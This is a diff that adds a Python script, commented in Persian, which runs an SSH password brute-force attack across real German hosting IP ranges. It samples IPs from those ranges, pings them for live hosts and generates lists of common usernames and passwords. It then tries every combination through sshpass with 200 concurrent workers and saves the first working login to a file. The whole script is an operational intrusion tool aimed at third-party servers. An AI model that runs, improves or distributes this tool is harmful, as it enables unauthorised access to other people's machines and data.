@@ -1,0 +1,215 @@
+#!/usr/bin/env python3
+import asyncio
+import random
+import ipaddress
+import os
+import sys
+import time
+from datetime import datetime
+
+# ------------------- تنظیمات -------------------
+TARGET_COUNTRY = "DE"  # آلمان
+PING_TIMEOUT = 1        # ثانیه برای هر پینگ
+SSH_TIMEOUT = 2         # ثانیه برای اتصال SSH
+MAX_WORKERS = 200       # تعداد کارگر همزمان برای تست SSH
+TARGET_RATE_PER_SEC = 500  # رویایی! عملاً به این نمی‌رسیم
+
+# رنج‌های معروف آلمان (Hetzner, Contabo, etc.)
+GERMAN_RANGES = [
+    "136.243.0.0/16",
+    "5.9.0.0/16",
+    "78.46.0.0/15",
+    "85.10.192.0/18",
+    "88.198.0.0/16",
+    "95.216.0.0/15",
+    "116.203.0.0/16",
+    "138.201.0.0/16",
+    "144.76.0.0/16",
+    "148.251.0.0/16",
+    "157.90.0.0/16",
+    "159.69.0.0/16",
+    "168.119.0.0/16",
+    "176.9.0.0/16",
+    "188.40.0.0/16",
+    "193.47.80.0/20",
+    "213.133.96.0/19",
+]
+
+# لیست یوزرنیم‌های رایج
+COMMON_USERNAMES = [
+    "root", "admin", "user", "ubuntu", "debian", "centos", "ftp", "test",
+    "oracle", "postgres", "mysql", "nginx", "www-data", "nobody", "support",
+    "backup", "user1", "student", "pi", "azureuser", "ec2-user"
+]
+
+# لیست پایه پسورد (برای تولید)
+BASE_PASSWORDS = [
+    "123456", "password", "123456789", "12345", "12345678", "qwerty", "abc123",
+    "password123", "admin", "root", "welcome", "login", "passw0rd", "toor",
+    "1qaz2wsx", "zaq12wsx", "qwertyuiop", "admin123", "P@ssw0rd", "Passw0rd!"
+]
+
+# ------------------- توابع کمکی -------------------
+def generate_ips_from_ranges(ranges, max_ips=5000):
+    """از هر رنج تعدادی آی‌پی تصادفی تولید کن (حداکثر max_ips)"""
+    all_ips = set()
+    for r in ranges:
+        network = ipaddress.ip_network(r)
+        hosts = list(network.hosts())
+        if not hosts:
+            continue
+        # به ازای هر رنج، تعدادی آی‌پی تصادفی می‌گیریم (حداکثر 100 تا)
+        sample_count = min(100, len(hosts))
+        for ip in random.sample(hosts, sample_count):
+            all_ips.add(str(ip))
+        if len(all_ips) >= max_ips:
+            break
+    return list(all_ips)[:max_ips]
+
+async def ping_ip(ip):
+    """بررسی زنده بودن با پینگ (async)"""
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            "ping", "-c", "1", "-W", str(PING_TIMEOUT), ip,
+            stdout=asyncio.subprocess.DEVNULL,
+            stderr=asyncio.subprocess.DEVNULL
+        )
+        await proc.wait()
+        return proc.returncode == 0
+    except:
+        return False
+
+async def scan_alive_ips(ip_list):
+    """پینگ همزمان روی همه آی‌پی‌ها و برگردوندن آی‌پی‌های زنده"""
+    tasks = [ping_ip(ip) for ip in ip_list]
+    results = await asyncio.gather(*tasks)
+    return [ip for ip, alive in zip(ip_list, results) if alive]
+
+def generate_usernames():
+    """تولید فایل usernames.txt از لیست پیش‌فرض"""
+    with open("usernames.txt", "w") as f:
+        for u in COMMON_USERNAMES:
+            f.write(u + "\n")
+    print(f"[+] {len(COMMON_USERNAMES)} یوزرنیم در usernames.txt ذخیره شد.")
+
+def generate_passwords(count=500):
+    """تولید پسوردهای ترکیبی ساده (تعداد count)"""
+    passwords = set(BASE_PASSWORDS)
+    # اضافه کردن اعداد تصادفی به پسوردهای پایه
+    for _ in range(count - len(passwords)):
+        base = random.choice(BASE_PASSWORDS)
+        suffix = str(random.randint(1, 9999))
+        passwords.add(base + suffix)
+        passwords.add(base + "_" + suffix)
+    passwords = list(passwords)[:count]
+    with open("passwords.txt", "w") as f:
+        for p in passwords:
+            f.write(p + "\n")
+    print(f"[+] {len(passwords)} رمزعبور در passwords.txt ذخیره شد.")
+    return passwords
+
+async def test_ssh(ip, username, password, semaphore, stop_event):
+    """تست یک ترکیب. اگر موفق شد، stop_event رو set کن و برگردون (ip,user,pass)"""
+    if stop_event.is_set():
+        return None
+    async with semaphore:
+        cmd = (
+            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
+            f"-o ConnectTimeout={SSH_TIMEOUT} -o PubkeyAuthentication=no "
+            f"-o PreferredAuthentications=password -o LogLevel=ERROR "
+            f"{username}@{ip} exit"
+        )
+        try:
+            proc = await asyncio.create_subprocess_shell(
+                cmd,
+                stdout=asyncio.subprocess.DEVNULL,
+                stderr=asyncio.subprocess.DEVNULL
+            )
+            await asyncio.wait_for(proc.wait(), timeout=SSH_TIMEOUT+1)
+            if proc.returncode == 0:
+                stop_event.set()
+                return (ip, username, password)
+        except:
+            pass
+        return None
+
+async def main_attacker(alive_ips, usernames, passwords):
+    """حمله اصلی با MAX_WORKERS کارگر همزمان تا پیدا شدن اولین موفقیت"""
+    print(f"[*] شروع حمله روی {len(alive_ips)} آی‌پی زنده با {len(usernames)} یوزر و {len(passwords)} پسورد")
+    total_tests = len(alive_ips) * len(usernames) * len(passwords)
+    print(f"[*] مجموع ترکیب‌ها: {total_tests}")
+    semaphore = asyncio.Semaphore(MAX_WORKERS)
+    stop_event = asyncio.Event()
+    tasks = []
+    # ساخت تمام تسک‌ها - اما برای صرفه‌جویی در حافظه، یک صف می‌سازیم بهتره
+    # اینجا برای سادگی، همه رو می‌سازیم (اگر تعداد کمتر از 10000 ترکیب باشه)
+    for ip in alive_ips:
+        for user in usernames:
+            for pwd in passwords:
+                tasks.append(test_ssh(ip, user, pwd, semaphore, stop_event))
+    # اجرای همزمان با gather ولی با محدودیت (خود semaphore کار رو انجام میده)
+    results = await asyncio.gather(*tasks)
+    for res in results:
+        if res:
+            ip, user, pwd = res
+            print(f"\n🟢 SUCCESS! 🟢")
+            print(f"IP: {ip}")
+            print(f"User: {user}")
+            print(f"Password: {pwd}")
+            with open("success.txt", "w") as f:
+                f.write(f"{ip} {user} {pwd}\n")
+            return True
+    return False
+
+# ------------------- رانر اصلی -------------------
+async def runner():
+    print("========================================")
+    print("   SSH GIANT - 4 RUNNER SYSTEM")
+    print(f"شروع: {datetime.now()}")
+    print("========================================\n")
+
+    # رانر 1: تولید آی‌پی از رنج‌های آلمان
+    print("[RUNNER 1] Generating IPs from German ranges...")
+    ips = generate_ips_from_ranges(GERMAN_RANGES, max_ips=5000)
+    print(f"[+] {len(ips)} IP generated. Saved to all_ips.txt")
+    with open("all_ips.txt", "w") as f:
+        for ip in ips:
+            f.write(ip + "\n")
+
+    # رانر 2: پینگ و فیلتر زنده‌ها
+    print("\n[RUNNER 2] Pinging IPs to find alive hosts...")
+    alive_ips = await scan_alive_ips(ips)
+    print(f"[+] {len(alive_ips)} IPs are alive. Saved to alive_ips.txt")
+    with open("alive_ips.txt", "w") as f:
+        for ip in alive_ips:
+            f.write(ip + "\n")
+
+    # رانر 3: تولید یوزرنیم
+    print("\n[RUNNER 3] Generating usernames...")
+    generate_usernames()
+    with open("usernames.txt", "r") as f:
+        usernames = [line.strip() for line in f if line.strip()]
+
+    # رانر 4: تولید پسورد
+    print("\n[RUNNER 4] Generating passwords...")
+    generate_passwords(count=1000)  # تعداد 1000 پسورد مختلف
+    with open("passwords.txt", "r") as f:
+        passwords = [line.strip() for line in f if line.strip()]
+
+    # رانر اصلی: تست
+    print("\n[MAIN RUNNER] Starting brute force attack with high speed...")
+    success = await main_attacker(alive_ips, usernames, passwords)
+
+    if success:
+        print("\n✅ حمله با موفقیت پایان یافت. نتایج در success.txt ذخیره شد.")
+    else:
+        print("\n❌ هیچ ترکیب موفقی پیدا نشد.")
+
+    print(f"\nپایان: {datetime.now()}")
+
+if __name__ == "__main__":
+    # نصب خودکار sshpass اگر نصب نبود
+    if os.system("command -v sshpass > /dev/null 2>&1") != 0:
+        print("[!] Installing sshpass...")
+        os.system("sudo apt update && sudo apt install -y sshpass")
+    asyncio.run(runner())
